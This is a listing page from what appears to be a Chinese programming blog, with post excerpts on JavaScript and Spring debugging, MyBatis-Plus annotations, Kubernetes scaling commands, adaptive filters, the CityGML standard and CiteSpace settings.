	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e51450b0b941c6b60c038100bb630bc9/" rel="bookmark">
			错误解决：Uncaught TypeError: Cannot read properties of null (reading ‘XXX‘).
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		报错信息： 前端代码： $(document).ready(function() { $.ajax({ url: "......", type: "GET", dataType: "json", success: function(json) { if (......) { $("#username").val(json.data.username); ...... } else { ...... } }, error:function(xhr) { ...... } }); }); 这里的目的是打开特定页面后，自动将用户登录后 session 中保存的 username 取出并将值赋给&lt;input&gt;标签。
但是在测试的时候，打开该页面控制台就出现报错。报错意思大概就是你需要的这个 “username” 属性的值本来就是空的，所以无法获取到它的值。
原因有很多：
可以console.log，查看一下结果；属性字段不匹配；sql语句的问题。...... 但我的问题不在上述原因中。
我想既然显示 username 中的值为 null 就说明 session 大概率没有保存用户登录后的信息，既然没有信息那么大概率与控制层有关。而控制层无非包含接口及实现类，且最终将问题锁定在实现类。这里也算是一个小坑：
当编写完接口中的方法，实现类中进行实现的时候，个人往往喜欢通过快捷方式重写实现接口中的方法，而这时加载出的方法默认会返回 null 。在编写方法体完成后没有注意 return 的修改，导致没有返回 User 对象。
这次出错的原因与上次一致，此后还是应该多注意这类错误。
https://blog.csdn.net/m0_56426418/article/details/129895408
控制层代码： @Override public User ......(......) { // TODO Auto-generated method stub User user = new User(); .
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/e51450b0b941c6b60c038100bb630bc9/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/774967ca73236db2d7fed93fff337fe8/" rel="bookmark">
			解决问题：AttributeError: ‘Text‘ object has no property ‘FontProperties‘
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		问题代码：
报错提示：
解决办法：
成功解决！
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/53aa245e16006f26ec3688bd3c813889/" rel="bookmark">
			用代码画一只懒羊羊
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 简介代码运行效果备注 简介 心血来潮，想用 Python 的 Turtle 库做点绘画工作，于是画了一只可爱的懒羊羊，如下：
绘画过程可在下面平台查看：
抖音：
用代码画一只懒羊羊
b站：
用代码画一只懒羊羊_哔哩哔哩_bilibili
代码 # coding=gbk import turtle def plotLine(points, pencolor=None, width=None, speed=None): ''' 功能：画折线 参数： - points : 一系列点，用列表或元组表示 - pencolor : 画笔颜色，默认不变 - width : 画笔宽度，默认不变 - speed : 绘制速度，默认不变 ''' # 记录旧参数 oldpencolor = turtle.pencolor() oldwidth = turtle.width() oldspeed = turtle.speed() # 修改新参数 if pencolor is not None: turtle.pencolor(pencolor) if width is not None: turtle.width(width) if speed is not None: turtle.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/53aa245e16006f26ec3688bd3c813889/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ba2802f3bc9086067e18ca0adf6c676f/" rel="bookmark">
			在IntelliJ IDEA中配置Git
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		给大家说说在inteliJ IDEA中如何配置git:
下载安装Git工具 目录
下载安装Git工具
在IntelliJ IDEA中配置Git
在IntelliJ IDEA中利用Git拉取项目
1. 访问gitee或github，找到项目对应的仓库，并复制仓库地址。
2 打开IDEA，依次选择菜单:File-&gt;New-&gt;Project from Version Control .
3 在弹出框中输入仓库路径(从第一步中gitee或github复制的路径)并点击Clone.
4 在弹出框中输入gitee或github的账号和密码并点击Log in.
等待下载完毕即可 .
在IntelliJ IDEA中使用Git推送项目
去gitee网站注册用户
1 创建仓库
在IDEA中将项目导入版本控制
push失败的解决办法：
访问git官网:Git下载合当前系统的安装包，下载后进行安装。
在IntelliJ IDEA中配置Git 菜单栏顺序选择: File-&gt;Settings,在弹出框中选择下图中的Git
然后点击右侧上方输入框 Path to Git executable:中右面的浏览图标(小文件夹)，并定位git的可执行程序(git.exe文件在git安装目录下的cmd文件夹中)。
点击Test按钮。如果点击后可以显示出版本号，说明配置成功，此时点击窗口下侧的OK按钮即可。
下面给大家说一说
在IntelliJ IDEA中利用Git拉取项目 1. 访问gitee或github，找到项目对应的仓库，并复制仓库地址。 2 打开IDEA，依次选择菜单:File-&gt;New-&gt;Project from Version Control . 3 在弹出框中输入仓库路径(从第一步中gitee或github复制的路径)并点击Clone. 4 在弹出框中输入gitee或github的账号和密码并点击Log in. 等待下载完毕即可 . 在IntelliJ IDEA中使用Git推送项目 首先
去gitee网站注册用户 gitee网站地址:Gitee - 企业级 DevOps 研发效能平台
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/ba2802f3bc9086067e18ca0adf6c676f/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/131f948686be5cbb5672e8c8f0c48947/" rel="bookmark">
			《移动软件开发》实验二：天气查询小程序
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		2022年夏季《移动软件开发》实验二：天气查询小程序 一、实验目标 1、掌握服务器域名配置和临时服务器部署；2、掌握 wx.request 接口的用法。
二、实验步骤 1. 准备工作 1.1. API密钥申请 ​ 进入和风天气官方网址：https://www.heweather.com,注册并激活免费类型的用户，可以看到申请到的个人认证key,个人认证key的作用为该信息在小程序发出网络请求时会作为身份识别的标识发送给和风天气的第三方服务器。我申请到的个人key如下。
1.2 API调用方法 获取实时天气 获取LocationID 1.3 服务器域名配置 ​ 每一个小程序在与指定域名地址进行网络通讯前都必须将该域名地址添加到管理员后台名单，因此需要通过微信开发公众平台将需要通讯的两个域名加入到request合法域名中，如下如图所示。
2. 项目创建 创建空白文件夹weatherDemo用与存放小程序项目
3. 页面配置 3.1 创建页面文件 项目创建完毕后，在根目录中会生成文件夹pages用于存放页面文件。一般来说首页默认命名为index，表示小程序运行的第一个页面，本项目只需要保留首页（index）即可。 ​ 具体操作如下：
​ (1）将 app.json 文件内 pages 属性中的“ pages / logs / logs ”删除，并删除上一行末尾的
逗号。
(2）按快捷键 Cirl + S 保存当前修改。
3.2 删除和修改文件 具体操作如下：
(1) 删除utils文件夹及其内部所有内容。
(2）删除 pages 文件夹下的 logs 目录及其内部所有内容。
(3）删除 index.Wxml 和 index.Wxss 中的全部代码。
(4）删除 index.js 中的全部代码，并且输人关键词“ page ”找到第二个选项按回车键让其自动补全函数。
(5）删除 app.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/131f948686be5cbb5672e8c8f0c48947/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/07728f047926104e37634cbfa28d6ca1/" rel="bookmark">
			面向对象编程和面向过程编程有啥区别？
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		面向对象编程（Object-Oriented Programming，简称OOP）和面向过程编程（Procedural Programming）是两种不同的编程范式。
面向对象编程强调“对象”，它把问题看作是由一些相互作用的“对象”构成的，这些对象通过相互发送消息来完成任务。在面向对象编程中，每个对象都有自己的状态和行为，它们通过定义类和实例化对象来实现。面向对象编程主要关注于如何封装、继承和多态。
面向过程编程强调“过程”，它把问题看作是一些步骤的集合，这些步骤按照一定的顺序执行。在面向过程编程中，程序的执行是由一系列函数调用完成的，每个函数完成一部分具体的操作。面向过程编程主要关注于如何把问题分解成一系列步骤并实现这些步骤。
两者最大的区别在于设计思想上的不同。面向对象编程强调封装性、继承性和多态性，使得程序具有更好的可读性、可扩展性和可维护性；而面向过程编程则注重解决问题的步骤和具体实现，更加关注程序的效率和执行速度。面向对象编程更加适合大型、复杂的程序开发，而面向过程编程则适用于简单的任务和小型程序。
需要注意的是，现代编程语言往往支持同时使用面向对象编程和面向过程编程，例如Java、Python等。
因此，在实际开发中，根据问题的具体情况选择合适的编程范式才是最重要的。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4e2f8bea1b6ccd82ce95dfb636ecee88/" rel="bookmark">
			现代信号处理——自适应滤波器（LMS自适应滤波器）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、自适应滤波简介
维纳滤波存在的问题：
适用于平稳随机信号的最佳滤波，对于非平稳的随机信号，其统计特性（相关函数）是随机的，因此无法估计其相关函数，此时的维纳滤波不适用；
维纳滤波器的参数是固定的，就不可能根据输入信号的变换去自动调整滤波器的参数，此时的滤波器不是最优的。
维纳滤波器必须已知信号和噪声的有关统计特性（输入信号的自相关）。
自适应数字滤波器：利用前一时刻已获得的滤波器参数等结果，自动地调节现时刻的滤波器参数，以适应信号与噪声未知的或随时间变化的统计特性，从而实现最优滤波。
自适应滤波器H(z)的系数根据误差信号，通过一定的自适应算法，不断地进行改变，使输出y(n)最接近期望信号d(n)。
实际中，d(n)要根据具体情况进行选取。 自适应滤波器的特点：
滤波器的参数可以自动地按照某种准则调整到最佳滤波，是一种最佳的时变数字滤波器；
实现时不需要任何关于信号和噪声的先验统计知识；
具有学习和跟踪的性能。
自适应数字滤波器的应用系统：模型识别；通信信道的自适应均衡；雷达与声纳的波束形成；消除心电图中的电源干扰；噪声中信号的检测、跟踪、增强和线性预测等。
自适应滤波器分类：最小均方误差（LMS）自适应滤波器；递归最小二乘（RLS）自适应滤波器。
二、LMS自适应滤波器的基本原理
利用LMS准则求最佳权系数和最小均方误差
当滤波器的单位脉冲响应取最佳值时，其误差信号和输入信号是正交的。 三、最陡下降算法
四、Widrow-Hoff LMS算法 LMS算法的权值计算 LMS(Least Mean Square)算法的梯度估计值用一条样本曲线进行计算，公式如下：
权系数也是在理想情况下的权轨迹附近随机变化的
搜索方向为瞬时梯度负方向，不能保证每一步更新都使目标函数值减小，但总趋势使目标函数值减小。
五、LMS算法的收敛性质
优点：算法简单，易于实现，算法复杂度低(LMS&lt;RLS)，能够抑制旁瓣效应缺点： 收敛速率较慢(LMS&lt;RLS)，因为LMS滤波器系数更新是逐点的（每来一个新的x(n)和d(n)，滤波器系数就更新一次）,每一次采样点梯度的估计对于真实梯度会存在误差，导致滤波器系数的每次更新不会严格按照真实梯度方向更新，而是有一定的偏差跟踪性能较差，并且随着滤波器阶数(步长参数)升高，系统的稳定性下降LMS要求不同时刻的输入向量x(n)线性无关——LMS 的独立性假设。如果输入信号存在相关性，会导致前一次迭代产生的梯度噪声传播到下一次迭代，造成误差的反复传播，收敛速度变慢，跟踪性能变差。 所以，理论上，LMS 算法对白噪声的效果最好。为了降低输入信号的相关性，出现了一类“解相关LMS”算法，这里就不展开讲述了。
参考视频：
https://www.bilibili.com/video/BV1wS4y1D7ng?p=9&amp;vd_source=77c874a500ef21df351103560dada737
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/702d9ed82fd817cdc16485b9ba456d81/" rel="bookmark">
			库函数查询工具与程序员问答社区分享
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 在前面的小结以及学习过程中，我们经常会碰到一些我们不熟悉或者不认识的函数，在这里，小编在这里给大家介绍分享一些库函数查询的工具，为后面的函数总结过渡一下。
目录
库函数查询工具介绍：
www.cplusplus.com
http://en.cppreference.com —（en英文版）
http://zh.cppreference.com —（zh中文版)
MSDN（Microsoft Developer Network）—微软开发软站
程序员问答社区
stackoverflow.com
segment faut.com(段错误、思否)
库函数查询工具介绍： www.cplusplus.com 这里以strlen函数为例，如下图：
包括信息有：包含头文件，返回值，参数，使用方法等......
http://en.cppreference.com —（en英文版） http://zh.cppreference.com —（zh中文版) 以上三种方式是C语言/C++提供的库函数（C/C++不分家嘛）
MSDN（Microsoft Developer Network）—微软开发软站 MSDN是由微软提供的开发软站，现在市面上的MSDN一般为几个G及以上，这里我发现一个70MB左右的MSDN，资源链接在下方。
链接：https://pan.baidu.com/s/1mwe4kFDkXWfNDEPLJYPTDg 提取码：23bt
程序员问答社区 除了CSDN外，还有一些程序员的问答社区，例如下面的网站：
stackoverflow.com segment faut.com(段错误、思否) 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2ac163538ae228304593691572c5bd8d/" rel="bookmark">
			4.mybatis-plus-常用注解
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1.@TableName 描述：表名注解，标识实体类对应的表使用位置：实体类 将数据库中user表更名为mp_user
@TableName("mp_user") public class User { private Long id; private String name; private Integer age; private String email; } # 或者配置mybatis-plus全局配置 mybatis-plus: configuration: # 日志 log-impl: org.apache.ibatis.logging.stdout.StdOutImpl #开启映射时驼峰命名 map-underscore-to-camel-case: true # 设置mybatis-plus全局配置 global-config: db-config: # 设置表名前缀 table-prefix: mp_ 参数说明
属性类型必须指定默认值描述valueString否“”表名schemaString否“”schemakeepGlobalPrefixboolean否false是否保持使用全局的 tablePrefix 的值（当全局 tablePrefix 生效时）resultMapString否“”xml 中 resultMap 的 id（用于满足特定类型的实体类对象绑定）autoResultMapboolean否false是否自动构建 resultMap 并使用（如果设置 resultMap 则不会进行 resultMap 的自动构建与注入）excludePropertyString[]否{}需要排除的属性名 @since 3.3.1 关于 autoResultMap 的说明：
MP会自动构建一个 resultMap 并注入到 MyBatis 里（一般用不上），请注意以下内容：
因为 MP 底层是 MyBatis，所以 MP 只是帮您注入了常用 CRUD 到MyBatis 里，注入之前是动态的（根据您的 Entity 字段以及注解变化而变化），但是注入之后是静态的（等于 XML 配置中的内容）。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/2ac163538ae228304593691572c5bd8d/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2467b22366f252de626131afdf046c3c/" rel="bookmark">
			ER_NOT_SUPPORTED_AUTH_MODE: Client does not support authentication protocol requested by server； con
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		最新的mysql模块并未完全支持MySQL 8的加密方式，因此，我们需要修改mysql模块中密码。
首先找到对应的安装路径：
第一步 找到MYSQL的安装路径下的bin目录，cmd/终端
win：C:\Program Files\MySQL\MySQL Server 8.0\bin
mac：usr/local/mysql 对应的版本号
第二步 执行命令 mysql -u root -p 并且输入密码 进入 mysql
若：显示 command not found: mysql 执行此行命令 alias mysql=/usr/local/mysql/bin/mysql
在 mysql -u root -p 并且输入密码 进入 mysql
第三步 修改 mysql 密码
ALTER USER 'root'@'localhost' IDENTIFIED WITH mysql_native_password BY '新密码'
修改完毕后 运行此命名
FLUSH PRIVILEGES;
图形化工具也需要设置同样密码 方法如下
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c0defab5915f4e96bc070aa5264622be/" rel="bookmark">
			Spring 事务
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
一、事务简介
二、在Spring中实现事务 编程式事务 声明式事务
三、事务的传播机制
一、事务简介 事务：就是将一组操作封装成为一个整体执行单元，要么全部执行，要么都不执行。
假如事务执行了一半发生了错误就会对已经执行的部分进行回滚操作。
常见的应用场景就是转账事务，转账过程中发生错误就会全部回滚到事务最初的状态。
二、在Spring中实现事务 在Spring中实现事务有两种方式：
编程式事务（通过写代码操作事务）；声明式事务（通过注解开启和提交事务）。 编程式事务 在编程式事务中包含如下三个重要步骤：
获取事务；提交事务；回滚事务； 在编程式事务中，需要用到以下的两个对象：
DataSourceTractionManager；TractionDefinition； 实现一个事务实现添加用户到数据库：
首先定义Mapper接口，在该接口中定义增加用户的方法。
@Mapper public interface UserMapper { int add(UserInfo userInfo) ;//添加用户返回受影响的行数 } 在resources文件夹下新建mapper文件夹生成UserMapper.xml文件，其中新增用户的标签如下：
&lt;insert id="add"&gt; insert into userinfo(username,password) values (#{username},#{password}) &lt;/insert&gt; 然后在service包下创建UserService类：
@Service public class UserService { @Autowired UserMapper userMapper; public int add(UserInfo userInfo){ return userMapper.add(userInfo); } } controller包下的UserController类的内容如下：
@RestController public class UserController { @Autowired private UserService userService; @Autowired private DataSourceTransactionManager transactionManager; @Autowired private TransactionDefinition transactionDefinition; @RequestMapping("
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/c0defab5915f4e96bc070aa5264622be/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f422cdeec482db5ed8e65609662cf7ff/" rel="bookmark">
			k8s 弹性伸缩pod ＜常用命令一＞
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1、自动的弹性伸缩
kubectl autoscale deployment hpa-demo --cpu-percent=70 --min=1 --max=8
2、手动的增加pod数
kubectl scale -replicas=5 deployment 3、实现水平扩展或收缩
kubectl scale deployment kubernetes-dashboard --replicas=2 -n kube-system kubectl scale deployment kubernetes-dashboard --replicas=1 -n kube-system 4、创建命名空间通过命令创建 kubectl create namespace new-namespace 通过文件创建cat &gt; my-namespace.yaml &lt;&lt; EOF
apiVersion: v1
kind: Namespace
metadata:
name: new-namespace
EOF
kubectl create -f ./my-namespace.yaml
kubectl apply -f ./my-namespace.yaml 5、删除命令空间
kubectl delete namespaces new-namespace
删除一个namespace会自动删除所有属于该namespace的资源。
注意：default 和 kube-system 命名空间不可删除。
6、自动扩展集群支持 horizontal pod autoscaling， 可以为Deployment设置自动扩展 kubectl autoscale deployment kubernetes-dashboard --min=1 --max=5 --cpu-percent=80 -n kube-system 查看hpa 状态kubectl get hpa kubernetes-dashboard -n kube-system
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/f422cdeec482db5ed8e65609662cf7ff/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b70c34553f5a2d637342b189607702f3/" rel="bookmark">
			关于视觉SLAM十四讲sophus库安装报错
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 Sophus安装：
git clone https://github.com/strasdat/sophus.git cd sophus mkdir build cmake .. make 这时候系统报错
error: lvalue required as left operand of assignment 32 | unit_complex_.real() = 1.; | ~~~~~~~~~~~~~~~~~~^~ error: lvalue required as left operand of assignment 32 | unit_complex_.real() = 1.; | ~~~~~~~~~~~~~~~~~~^~ 这是因为实例unit_complex_的方法real()和imag()不能用=直接赋值：
SO2::SO2() { // unit_complex_.real() = 1.; unit_complex_.real(1.); // unit_complex_.imag() = 0.; unit_complex_.imag(0.); } 具体步骤：
cd ./sophus/sophus sudo nano so2.cpp 保存后退出，再进入build文件夹中进行cmake
sudo make 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/73ce4397dcae92c79c006bdbf022c5bb/" rel="bookmark">
			CityGML标准文档（13）（第七章——7.1)
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 7.1 CityGML 核心模块和扩展模块 每个CityGML模块都由其自己的XML模式定义文件指定，并在一个单独的全局唯一的XML目标命名空间中定义。根据模块之间的依赖关系，每个模块还可以导入与这些相关的CityGML模块相关联的命名空间。但是，单个命名空间不应直接包含在两个模块中。因此，属于一个模块的所有元素仅与该模块的命名空间相关联。通过这种方式，可以保证在CityGML实例文档中正确地分离并区分模块元素。
与1.0之前的CityGML版本相比，因为不再有单一的CityGM命名空间，上述命名空间的约定为数据文件引入了额外的复杂度。相反，不同CityGML模块的组件，以及因此产生的不同命名空间的组件，可以在同一CityGML实例文档中任意混合。此外，应用程序可能必须解析包含应用程序本身未使用的模块元素的实例文档。然而，这些解析问题可以很容易地被非“模式感知”应用程序克服，即不以通用方式解析和解释GML应用程序模式的应用程序。可以跳过与应用程序所使用的CityGML配置文件所声明的命名空间不同的命名空间中的元素。当使用CityGML的应用程序扩展机制（ADE）时，其内容必须进行可比较（参见第10.13条）。
至于CityGML标准的2.0版本，没有两个主题扩展模块因依赖关系而相关。因此，所有扩展模块都是真正相互独立的，并且可以由实现单独支持。然而，CityGML核心模块是任何扩展模块的依赖项。这意味着核心模块的XML模式文件由定义扩展名的每个XML模式文件导入。
CityGML模块之间的依赖关系如图8的UML图所示。每个模块都由一个包表示。包名称与模块名称相对应。图中的虚线箭头表示箭头尾部的模式取决于箭头头部的模式。对于CityGML模块，一个模式＜import＞的另一个模式以及相应的XML命名空间之间会产生依赖关系。例如，扩展模块Building导入CityGML Core模块的模式。表4对每个模块进行了简要描述。
图8:UML包图，说明了CityGML的独立模块及其模式依赖关系。每个扩展模块（由叶包表示）进一步导入GML 3.1.1模式定义，以表示其主题类的空间属性。出于可读性的原因，省略了相应的依赖项。
模块名CityGML Core（核心模块）XML命名空间标识符http://www.opengis.net/citygml/2.0XML 格式文件cityGMLBase.xsd建议的命名空间前缀core模块描述CityGML Core模块定义了CityGML数据模型的基本组件。这里主要包括抽象基类，所有主题类都是从抽象基类中（过渡）派生出来的。但是，多个扩展模块通用的非抽象内容，例如基本数据类型，也在核心模块中定义。核心模块本身导入GML 3.1.1版本的XML模式定义文件和OASIS可扩展地址语言xAL。 模块名Appearance(外观）XML命名空间标识符http://www.opengis.net/citygml/appearance/2.0XML 格式文件appearance.xsd建议的命名空间前缀app模块描述Appearance模块提供了构建CityGML要素模型外观的方法，即可观察到的要素表面的属性。每个城市模型对象都可通过Apperance来存储外观属性数据。因此，核心模块中定义的抽象基类_CityObject通过使用CityGML的ADE对属性进行了附加扩展。因此，Apperance模块对所有主题扩展都有着比较重大的影响。 模块名Bridge(桥）XML命名空间标识符http://www.opengis.net/citygml/bridge/2.0XML 格式文件bridge.xsd建议的命名空间前缀bird模块描述Bridge模块可以以四个层次的细节（LOD 1-4）来表示桥梁、桥梁部件、桥梁装置和内部桥梁结构的主题和空间方面的内容 模块名Building(建筑）XML命名空间标识符http://www.opengis.net/citygml/building/2.0XML 格式文件building.xsd建议的命名空间前缀bldg模块描述Building模块允许以五个细节级别（LOD 0–4）表示建筑、建筑部件、建筑装置和内部建筑结构的主题和空间方面的内容。 模块名CityFurniture(城市设施）XML命名空间标识符http://www.opengis.net/citygml/cityfurniture/2.0XML 格式文件cityFurniture.xsd建议的命名空间前缀frn模块描述*CityFurniture *模块用于表示城市中的城市基础设施对象。城市基础设施是指我们在交通区、住宅区、广场或建成区看到的不可移动的物体，如路灯、交通标志、广告柱、长椅或公共汽车站等。 模块名CityObjectGroup(城市对象群组）XML命名空间标识符http://www.opengis.net/citygml/cityobjectgroup/2.0XML 格式文件cityObjectGroup.xsd建议的命名空间前缀grp模块描述CityObjectGroup模块为CityGML提供了分组概念。任意城市对象可以根据用户自定义的标准分组聚合，作为城市模型的一部分。组可以通过特定的属性进一步分类。 模块名Generics(通用范型）XML命名空间标识符http://www.opengis.net/citygml/generics/2.0XML 格式文件generics.xsd建议的命名空间前缀gen模块描述Generics模块为CityGML数据模型提供了通用扩展，可用于建模和交换CityGML预定义主题类未涵盖的附加属性和功能。然而，只有在任何其他CityGML模块没有提供适当的主题类或属性的情况下，才能使用通用扩展。为了表示泛型属性，Generics模块通过使用CityGML中ADE机制的附加属性来扩充核心模块中定义的抽象基类_CityObject。因此，Generics模块对所有主题扩展模块都有影响 模块名LandUse(土地利用）XML命名空间标识符http://www.opengis.net/citygml/landuse/2.0XML 格式文件landUse.xsd建议的命名空间前缀luse模块描述LandUse模块表示专门用于特定土地利用的区域的地表 模块名Relief(表面起伏状态，多表示数字地形）XML命名空间标识符http://www.opengis.net/citygml/relief/2.0XML 格式文件relief.xsd建议的命名空间前缀dem模块描述Relief模块用于表示城市中的地形。CityGML通过支持不同细节级别的地形表示，来反映不同的精度或分辨率。地形可以用常规的栅格或网格、不规则三角网、折线或大体量的点来表示。 模块名Transportation(交通）XML命名空间标识符http://www.opengis.net/citygml/transportation/2.0XML 格式文件transportation.xsd建议的命名空间前缀tran模块描述Transportation模块用于表示城市内的交通要素，例如道路、轨道、铁路或广场。交通要素可以表示为线性网络，或者通过几何描述其3D表面来表示。 模块名Tunnel(隧道）XML命名空间标识符http://www.opengis.net/citygml/tunnel/2.0XML 格式文件tunnel.xsd建议的命名空间前缀tun模块描述Tunnel模块以四个细节层次（LOD 1-4）表示隧道、隧道部件、隧道安装和隧道内部结构的主题和空间方面的内容。 模块名Vegetation(植被）XML命名空间标识符http://www.opengis.net/citygml/vegetation/2.0XML 格式文件vegetation.xsd建议的命名空间前缀tun模块描述Vegetation模块提供了表示植被对象的主题类。CityGML的植被模型区分了树木等孤立植被对象和森林或其他植物群落等代表生物生境的植被区域。 模块名WaterBody(水体）XML命名空间标识符http://www.opengis.net/citygml/waterbody/2.0XML 格式文件waterBody.xsd建议的命名空间前缀wtr模块描述waterBody模块表示了河流、运河、湖泊和低洼盆地的之类的东西和它们的三维几何形状。不过，到目前为止，它并没有继承任何水文或其他流体力学方面的内容。 模块名TexturedSurface(文理表面，不赞成使用）XML命名空间标识符http://www.opengis.net/citygml/texturedsurface/2.0XML 格式文件texturedSurface.xsd建议的命名空间前缀tex模块描述texturedSurface模块可以为3D曲面指定视觉外观属性（颜色、光泽、透明度）和纹理。由于其建模方法的固有限制，该模块已被标记为不推荐使用，预计将在未来的CityGML版本中删除。该模块提供的外观信息可以转换为CityGML的Appearance 模块，而不会丢失信息。因此，强烈不推荐再使用TexturedSurface模块。 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c38049a316d2663bb85730229221b4da/" rel="bookmark">
			Citespace学习笔记
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、功能选择区 1、Time Slicing 2、Text processing 指对文献摘要、标题等文本信息进行预处理和分析，以便于后续的数据可视化和分析。其中，
Term Source（术语来源）是Text Processing中的一个参数，用于指定分析文本中的术语来源。具体而言，Term Source可以指定为以下几种类型：
1、Title：表示从文献标题中提取术语作为分析的对象。
2、Abstract：表示从文献摘要中提取术语作为分析的对象。
3、Keywords：表示从文献关键词中提取术语作为分析的对象。
4、Author Keywords：表示从文献作者提供的关键词中提取术语作为分析的对象。
通过设置Term Source参数，可以在文本处理过程中选择合适的术语来源，从而更好地反映研究问题的特点。例如，如果研究问题比较关注文献标题中的术语，可以将Term Source设置为Title；如果研究问题比较关注文献作者提供的关键词，可以将Term Source设置为Author Keywords。
需要注意的是，不同的Term Source会对分析结果产生不同的影响，因此在使用Text Processing参数时需要根据具体的研究问题和数据集的特点来选择最适合的参数。
2、Node Types 3、Link 在CiteSpace中，Link是一种分析文献之间相互引用关系的方式。Link分析可以通过多个参数来定义，这些参数可以在Link Control面板中进行设置。以下是Link Control面板中常用的参数及其含义：
Link Strength（连接强度）
指定连接强度的最小值和最大值。只有连接强度在指定范围内的连接才会被保留。
在CiteSpace中，Link Strength（连接强度）是指连接两个文献之间的强度，表示它们之间的关系有多紧密。Link Strength参数可以用不同的算法来计算，常见的算法包括：
1、Cosline（余弦相似度）：计算两个文献之间的相似度，具体而言，是将两个文献的关键词向量进行余弦计算，得出的结果越接近1，说明它们之间的相似度越高。
2、PMI（互信息）：表示两个文献之间出现关键词的频率与它们各自单独出现的概率的乘积之比。如果两个文献之间出现的关键词频率比单独出现的概率高，则它们之间的PMI值也会比较高。
3、Dice（Dice相似系数）：计算两个文献之间的相似度，具体而言，是将两个文献的关键词向量进行计算，得出的结果越接近1，说明它们之间的相似度越高。
4、Jaccard（Jaccard相似系数）：计算两个文献之间的相似度，具体而言，是将两个文献的关键词向量进行计算，得出的结果越接近1，说明它们之间的相似度越高。
需要注意的是，不同的Link Strength参数计算方法会对文献之间的连接强度产生不同的影响。在使用Link Strength参数时，需要根据具体研究问题和数据集的特点来选择最适合的计算方法。
Scope
决定了计算连接强度时考虑的文献范围。具体而言，Scope参数包括：
1、Within Slices（在时间切片内）：表示只考虑在同一个时间切片内的文献之间的连接强度，即同一年或同一时期内的文献之间的连接强度。
2、Across Slices（跨时间切片）：表示考虑在不同时间切片内的文献之间的连接强度，即不同年份或不同时期的文献之间的连接强度。
其中，时间切片（Time Slices）是指将研究时间范围划分成若干个相同长度的时间段，每个时间段被称为一个时间切片。通过选择Scope参数，可以在计算连接强度时考虑不同的文献范围，从而更好地反映研究问题的特点。
需要注意的是，选择不同的Scope参数会对连接强度的计算结果产生不同的影响，因此在使用Link参数时需要根据具体的研究问题和数据集的特点来选择最适合的参数。
4、Selection Criteria 4.1 g-index 用于衡量作者的论文数量和引用次数之间的平衡程度。
定义
g-index是一种基于引用次数的指标，它通过将作者的所有论文按照引用次数从高到低排序，找到最大的g值，使得前g篇论文的总引用次数不少于g^2。例如，如果一个作者的前3篇论文的总引用次数不少于9次，但前4篇论文的总引用次数不到16次，那么g-index为3。
使用
g-index是一种用于衡量作者产出和影响力的指标。与h-index类似，它能够综合考虑作者的论文数量和引用次数，但更加注重引用次数的平衡性。通常情况下，g-index越高，说明作者在领域内的影响力越大。
判断
在CiteSpace中，可以使用g-index来对作者的影响力进行比较。例如，将多位作者的g-index进行比较，可以得出谁在领域内具有更大的影响力。需要注意的是，不同学科领域的g-index标准可能会有所不同，因此不应该将不同领域的作者的g-index进行直接比较。
设置
在CiteSpace中，可以通过在“Parameters”中的“Analysis Type”下选择“g-index”来计算g-index。在“g-index Options”中，可以设置最小g值、最大g值和步长等参数。这些参数的选择取决于具体研究的目的和数据集的大小。例如，如果数据集很大，可以选择较大的步长和最大g值，以节省计算时间。
